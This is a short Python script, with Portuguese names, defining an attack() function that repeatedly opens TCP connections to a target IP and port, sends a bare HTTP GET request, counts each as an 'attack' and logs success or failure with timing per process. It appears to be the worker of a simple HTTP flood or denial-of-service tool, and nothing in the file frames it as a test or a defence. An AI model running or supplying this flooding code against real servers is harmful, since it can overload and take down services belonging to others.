import socket, os, json
from time import time

def attack(ip, port, req, return_dict):

    print('Processo Numero %d criado' % os.getpid())
    before = time()
    reqf = 0
    ataque_num = 0

    while reqf <= req:
        
        try:
            if reqf == req:
        
                after = time()
                result = after-before

                process = {
                    "id":os.getpid(),
                    "ip":ip,
                    "porta":port,
                    "requisicao":req,
                    "status":"Sucesso",
                    "requisicaofinal":reqf,
                    "duracao":result
                    }

                process_json = json.dumps(process)

                print(process_json)
                break

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.03)
            sock.connect_ex((ip,port))
            request = "GET / HTTP/1.1\r\nHost:localhost\r\n\r\n"
            sock.send(request.encode())
            sock.close()

            ataque_num += 1
            print('Processo: %d Numero de Ataques: %d'% (os.getpid(),ataque_num))

            reqf += 1
            

        except socket.error:

            after = time()
            result = after-before
            process = {
                "id":os.getpid(),
                "ip":ip,
                "porta":port,
                "requisicao":req,
                "status":"Falha",
                "requisicaofinal":reqf,
                "duracao":result
                }

            # print(json.dumps(process))
            return_dict.append(process)
            break
            